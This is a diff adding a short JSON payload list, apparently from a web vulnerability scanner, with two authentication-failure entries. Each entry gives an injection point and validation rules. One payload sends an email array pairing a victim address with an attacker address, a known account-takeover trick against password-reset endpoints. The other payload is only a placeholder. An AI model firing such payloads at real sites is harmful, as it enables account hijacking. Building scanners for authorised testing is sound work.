@@ -1,0 +1,24 @@
+[
+  {
+    "payload_id": "OWP-210858",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{\"email\":[\"victim@mail.com\",\"hacker@mail.com\"]}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  },
+  {
+    "payload_id": "OWP-210865",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "[...]",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|invalid|login"
+    }
+  }
+]
